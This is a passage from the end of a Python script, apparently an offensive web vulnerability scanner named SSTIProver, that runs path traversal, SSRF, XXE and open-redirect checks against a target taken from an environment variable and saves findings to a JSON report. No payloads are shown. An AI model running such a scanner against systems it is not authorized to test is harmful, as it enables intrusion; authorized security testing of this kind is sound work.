            await self.test_path_traversal(sess)
            await self.test_ssrf(sess)
            await self.test_xxe(sess)
            await self.test_open_redirect(sess)
        print(f"\n[+] SSTI/RCE complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    scanner = SSTIProver(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "ssti_rce.json"
    out.write_text(json.dumps(findings, indent=2))
    print(f"[+] Saved {len(findings)} findings -> {out}")

if __name__ == "__main__":
    asyncio.run(main())
